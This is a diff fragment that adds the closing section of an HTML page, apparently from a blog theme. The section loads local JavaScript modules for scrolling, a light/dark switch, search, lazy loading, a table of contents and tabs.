+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
